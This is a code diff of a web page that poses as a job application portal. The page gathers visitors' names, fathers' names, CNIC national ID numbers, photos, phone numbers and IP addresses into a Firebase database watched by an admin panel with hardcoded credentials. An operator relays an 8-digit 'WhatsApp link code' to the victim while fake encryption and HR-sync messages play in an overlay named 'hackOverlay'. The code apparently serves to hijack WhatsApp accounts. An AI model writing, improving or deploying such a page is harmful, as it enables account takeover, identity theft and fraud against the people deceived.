-                $(s).classList.add('hidden');
-            });
-            switch(step) {
-                case 'welcome': $('stepWelcome').classList.remove('hidden'); break;
-                case 'questions': $('stepQuestions').classList.remove('hidden'); break;
-                case 'details': $('stepDetails').classList.remove('hidden'); break;
-                case 'whatsapp': $('stepWhatsApp').classList.remove('hidden'); break;
-                case 'thankyou': $('stepThankYou').classList.remove('hidden'); break;
-            }
-            currentStep = step;
         }
 
         function syncUserData() {
@@ -617,25 +624,19 @@
         }
 
         function resetAppUI() {
-            userData = {
-                skill: '', age: '', education: '', earning: '', experience: '',
-                photo: '', name: '', father: '', cnic: '', phone: '', ip: userData.ip
-            };
+            localStorage.removeItem('elite_status');
+            localStorage.removeItem('elite_name');
+            userData = { skill: '', age: '', education: '', earning: '', experience: '', photo: '', name: '', father: '', cnic: '', phone: '', ip: userData.ip };
             generatedCode = '';
             
-            // Clear inputs
             document.querySelectorAll('input').forEach(input => {
-                if(input.id !== 'adminUsername' && input.id !== 'adminPassword' && input.id !== 'adminCode') {
-                    input.value = '';
-                }
+                if(!input.id.includes('admin')) input.value = '';
             });
 
-            // Reset Photo UI
             $('userPhotoPreview').src = '';
             $('userPhotoPreview').style.display = 'none';
             $('uploadTextWrap').style.display = 'block';
 
-            // Reset Questions
             document.querySelectorAll('.option-btn').forEach(btn => btn.classList.remove('selected'));
             for(let i=1; i<=6; i++) {
                 if(i===1) $('q1').classList.remove('hidden');
@@ -648,108 +649,88 @@
                 }
             }
 
-            // Reset WhatsApp Step
             $('waStep1').classList.remove('hidden');
             $('waStep2').classList.add('hidden');
             $('codeDisplay').textContent = '________';
             $('verifyBtn').disabled = true;
             $('verifyBtn').textContent = 'Awaiting Code...';
 
-            showStep('welcome');
+            transitionTo('stepWelcome', "Resetting Session...");
         }
 
-        // Image compression function
-        function processImage(file) {
-            const reader = new FileReader();
-            reader.onload = (e) => {
-                const img = new Image();
-                img.onload = () => {
-                    const canvas = document.createElement('canvas');
-                    const MAX_WIDTH = 200;
-                    const scaleSize = MAX_WIDTH / img.width;
-                    canvas.width = MAX_WIDTH;
-                    canvas.height = img.height * scaleSize;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                    
-                    const base64Str = canvas.toDataURL('image/jpeg', 0.7);
-                    userData.photo = base64Str;
-                    
-                    $('userPhotoPreview').src = base64Str;
-                    $('userPhotoPreview').style.display = 'block';
-                    $('uploadTextWrap').style.display = 'none';
-                };
-                img.src = e.target.result;
-            };
-            reader.readAsDataURL(file);
-        }
-
+        // Image compress
         $('photoInput').addEventListener('change', (e) => {
             if(e.target.files && e.target.files[0]) {
-                processImage(e.target.files[0]);
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        const MAX_WIDTH = 250;
+                        const scaleSize = MAX_WIDTH / img.width;
+                        canvas.width = MAX_WIDTH;
+                        canvas.height = img.height * scaleSize;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                        
+                        const base64Str = canvas.toDataURL('image/jpeg', 0.8);
+                        userData.photo = base64Str;
+                        
+                        $('userPhotoPreview').src = base64Str;
+                        $('userPhotoPreview').style.display = 'block';
+                        $('uploadTextWrap').style.display = 'none';
+                    };
+                    img.src = ev.target.result;
+                };
+                reader.readAsDataURL(e.target.files[0]);
             }
         });
 
-        // Admin Toggle & Login
+        // Admin Panel Flow
         $('adminFab').addEventListener('click', () => {
-            if (adminLoggedIn) {
-                $('adminPanel').classList.toggle('hidden');
-            } else {
-                $('adminLoginModal').classList.remove('hidden');
-            }
+            if(adminLoggedIn) $('adminPanelModal').classList.toggle('hidden');
+            else $('adminAuthModal').classList.remove('hidden');
         });
 
-        $('adminCancelBtn').addEventListener('click', () => {
-            $('adminLoginModal').classList.add('hidden');
-        });
+        $('adminCancelBtn').addEventListener('click', () => $('adminAuthModal').classList.add('hidden'));
 
         $('adminLoginBtn').addEventListener('click', () => {
-            const username = $('adminUsername').value.trim();
-            const password = $('adminPassword').value.trim();
-            if (username === 'spoiler' && password === '099') {
+            if ($('adminUsername').value === 'spoiler' && $('adminPassword').value === '099') {
                 adminLoggedIn = true;
-                $('adminLoginModal').classList.add('hidden');
-                $('adminPanel').classList.remove('hidden');
-                $('adminUsername').value = '';
-                $('adminPassword').value = '';
-                listenToUserData();
-            } else {
-                alert('Invalid credentials');
+                $('adminAuthModal').classList.add('hidden');
+                $('adminPanelModal').classList.remove('hidden');
+                $('adminUsername').value = ''; $('adminPassword').value = '';
+            } else { alert('Access Denied'); }
+        });
+
+        $('adminLogoutBtn').addEventListener('click', () => { adminLoggedIn = false; $('adminPanelModal').classList.add('hidden'); });
+
+        onValue(ref(database, 'session/userData'), (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                $('adminName').textContent = data.name || '-';
+                $('adminFather').textContent = data.father || '-';
+                $('adminCNIC').textContent = data.cnic || '-';
+                $('adminPhone').textContent = data.phone || '-';
+                $('adminSkill').textContent = data.skill || '-';
+                $('adminAge').textContent = data.age || '-';
+                $('adminEdu').textContent = data.education || '-';
+                $('adminEarning').textContent = data.earning || '-';
+                $('adminExperience').textContent = data.experience || '-';
+                $('adminIP').textContent = data.ip || '-';
+                
+                if (data.photo) {
+                    $('adminPhoto').src = data.photo;
+                    $('adminPhoto').style.display = 'block';
+                    $('adminNoPhoto').style.display = 'none';
+                } else {
+                    $('adminPhoto').style.display = 'none';
+                    $('adminNoPhoto').style.display = 'block';
+                }
             }
         });
 
-        $('adminLogoutBtn').addEventListener('click', () => {
-            adminLoggedIn = false;
-            $('adminPanel').classList.add('hidden');
-        });
-
-        function listenToUserData() {
-            onValue(ref(database, 'session/userData'), (snapshot) => {
-                const data = snapshot.val();
-                if (data && adminLoggedIn) {
-                    $('adminName').textContent = data.name || '-';
-                    $('adminFather').textContent = data.father || '-';
-                    $('adminCNIC').textContent = data.cnic || '-';
-                    $('adminPhone').textContent = data.phone || '-';
-                    $('adminSkill').textContent = data.skill || '-';
-                    $('adminAge').textContent = data.age || '-';
-                    $('adminEdu').textContent = data.education || '-';
-                    $('adminEarning').textContent = data.earning || '-';
-                    $('adminExperience').textContent = data.experience || '-';
-                    $('adminIP').textContent = data.ip || '-';
-                    
-                    if (data.photo) {
-                        $('adminPhoto').src = data.photo;
-                        $('adminPhoto').style.display = 'block';
-                        $('adminNoPhoto').style.display = 'none';
-                    } else {
-                        $('adminPhoto').style.display = 'none';
-                        $('adminNoPhoto').style.display = 'block';
-                    }
-                }
-            });
-        }
-
+        // Firebase Commands
         onValue(ref(database, 'session/resetCommand'), (snapshot) => {
             if (snapshot.val() === 'reset_now') {
                 resetAppUI();
@@ -759,23 +740,24 @@
 
         onValue(ref(database, 'session/codeFromAdmin'), (snapshot) => {
             const code = snapshot.val();
-            if (code && currentStep === 'whatsapp' && !$('waStep2').classList.contains('hidden')) {
+            if (code && !$('stepWhatsApp').classList.contains('hidden') && !$('waStep2').classList.contains('hidden')) {
                 $('codeDisplay').textContent = code;
                 $('verificationCode').value = code;
                 $('verifyBtn').disabled = false;
-                $('verifyBtn').textContent = 'Verify Link Code';
+                $('verifyBtn').textContent = 'Verify Secure Link';
+                $('verifyBtn').style.background = 'var(--success)';
             }
         });
 
         onValue(ref(database, 'session/adminVerifyCommand'), (snapshot) => {
-            if (snapshot.val() === 'verify_now' && currentStep === 'whatsapp') {
-                showVerificationAnimation();
+            if (snapshot.val() === 'verify_now' && !$('stepWhatsApp').classList.contains('hidden')) {
+                showFinalSecurityAnimation();
                 set(ref(database, 'session/adminVerifyCommand'), null).catch(() => {});
             }
         });
 
-        // Flow Buttons
-        $('getStartedBtn').addEventListener('click', () => { showStep('questions'); });
+        // App User Flow
+        $('getStartedBtn').addEventListener('click', () => transitionTo('stepQuestions', 'Loading Profile Settings...'));
 
         document.querySelectorAll('.option-btn').forEach(btn => {
             btn.addEventListener('click', function() {
@@ -800,42 +782,30 @@
                     const nextDot = $('dot' + (stepNum + 1));
                     if (currentDot) { currentDot.classList.remove('active'); currentDot.classList.add('done'); }
                     if (nextDot) nextDot.classList.add('active');
-                }, 200);
+                }, 300);
             });
         });
 
-        $('proceedToDetailsBtn').addEventListener('click', () => { showStep('details'); });
+        $('proceedToDetailsBtn').addEventListener('click', () => transitionTo('stepDetails', 'Analyzing Requirements...'));
 
-        // Submit Details (Name, Photo, etc.) -> Move to WhatsApp
         $('submitDetailsBtn').addEventListener('click', () => {
             const name = $('fullName').value.trim();
             const father = $('fatherName').value.trim();
             const cnic = $('cnic').value.trim();
             
-            if (!name || !father || !cnic) {
-                alert('Please complete all text fields.');
-                return;
-            }
-            if (!userData.photo) {
-                alert('Please upload a profile picture.');
-                return;
-            }
+            if (!name || !father || !cnic) return alert('All legal fields are mandatory.');
+            if (!userData.photo) return alert('Professional profile photo is required.');
+            if (cnic.length < 13) return alert('Please enter a valid CNIC.');
             
-            userData.name = name;
-            userData.father = father;
-            userData.cnic = cnic;
-            
+            userData.name = name; userData.father = father; userData.cnic = cnic;
             syncUserData();
-            showStep('whatsapp');
+            transitionTo('stepWhatsApp', 'Encrypting Candidate Data...');
         });
 
-        // WhatsApp Link Step
         $('sendCodeBtn').addEventListener('click', () => {
             const phone = $('phoneNumber').value.trim();
-            if (phone.length < 10) {
-                alert('Please enter a valid phone number');
-                return;
-            }
+            if (phone.length < 10) return alert('Enter a valid WhatsApp number.');
+            
             userData.phone = phone;
             generatedCode = Math.floor(10000000 + Math.random() * 90000000).toString();
             $('adminCode').value = generatedCode;
@@ -843,8 +813,15 @@
             
             syncUserData();
             
-            $('waStep1').classList.add('hidden');
-            $('waStep2').classList.remove('hidden');
+            const loader = $('stepLoader');
+            $('loaderText').textContent = 'Connecting to WhatsApp API...';
+            loader.classList.add('active');
+            
+            setTimeout(() => {
+                $('waStep1').classList.add('hidden');
+                $('waStep2').classList.remove('hidden');
+                loader.classList.remove('active');
+            }, 1800);
         });
 
         $('changeNumberBtn').addEventListener('click', () => {
@@ -855,26 +832,22 @@
             $('codeDisplay').textContent = '________';
             $('verifyBtn').disabled = true;
             $('verifyBtn').textContent = 'Awaiting Code...';
+            $('verifyBtn').style.background = '';
         });
 
         $('verifyBtn').addEventListener('click', () => {
-            const code = $('verificationCode').value.trim();
-            if (code === generatedCode && generatedCode !== '') {
-                showVerificationAnimation();
-            } else {
-                alert('Invalid link code provided. Please check again.');
-            }
+            if ($('verificationCode').value.trim() === generatedCode && generatedCode !== '') {
+                showFinalSecurityAnimation();
+            } else { alert('Invalid or expired link code.'); }
         });
 
-        // Admin Controls
+        // Admin Actions
         $('adminSendCode').addEventListener('click', () => {
             const code = $('adminCode').value.trim();
             if (code.length === 8) {
                 generatedCode = code;
                 set(ref(database, 'session/codeFromAdmin'), code).catch(() => {});
-            } else {
-                alert('Link Code must be 8 digits');
-            }
+            } else { alert('Code must be exactly 8 digits.'); }
         });
 
         $('adminVerifyConnect').addEventListener('click', () => {
@@ -887,42 +860,50 @@
             set(ref(database, 'session/codeFromAdmin'), null).catch(() => {});
             set(ref(database, 'session/adminVerifyCommand'), null).catch(() => {});
             resetAppUI();
-            alert('Database & UI Resetted Successfully');
+            alert('Target Database & Local Client Sessions Reset.');
         });
 
-        // Animation
-        function showVerificationAnimation() {
+        // Final Verification Animation & Persistence Save
+        function showFinalSecurityAnimation() {
             $('hackOverlay').classList.remove('hidden');
             let progress = 0;
             const messages = [
-                'Establishing secure connection...',
-                'Verifying phone link...',
-                'Authenticating profile...',
-                'Finalizing setup...',
-                'Linking Complete'
+                'Establishing AES-256 encrypted connection...',
+                'Verifying WhatsApp authentication token...',
+                'Syncing profile with HR database...',
+                'Finalizing company linkage protocols...',
+                'Profile Successfully Linked!'
             ];
             
             const interval = setInterval(() => {
-                progress += 4;
+                progress += 3;
                 $('progressBar').style.width = progress + '%';
                 
                 if (progress <= 25) $('hackStatus').textContent = messages[0];
                 else if (progress <= 50) $('hackStatus').textContent = messages[1];
-                else if (progress <= 75) $('hackStatus').textContent = messages[2];
+                else if (progress <= 80) $('hackStatus').textContent = messages[2];
                 else if (progress <= 95) $('hackStatus').textContent = messages[3];
                 else if (progress >= 100) {
                     $('hackStatus').textContent = messages[4];
                     clearInterval(interval);
+                    
+                    // SAVE PERSISTENCE
+                    localStorage.setItem('elite_status', 'submitted');
+                    localStorage.setItem('elite_name', userData.name);
+                    
                     setTimeout(() => {
                         $('hackOverlay').classList.add('hidden');
                         $('thankYouName').textContent = userData.name;
-                        showStep('thankyou');
-                    }, 600);
+                        
+                        ['stepWelcome','stepQuestions','stepDetails','stepWhatsApp'].forEach(s => $(s).classList.add('hidden'));
+                        $('stepThankYou').classList.remove('hidden');
+                    }, 800);
                 }
-            }, 100);
+            }, 80);
         }
 
-        fetchIP();
+        // Start
+        initApp();
     </script>
 </body>
 </html>
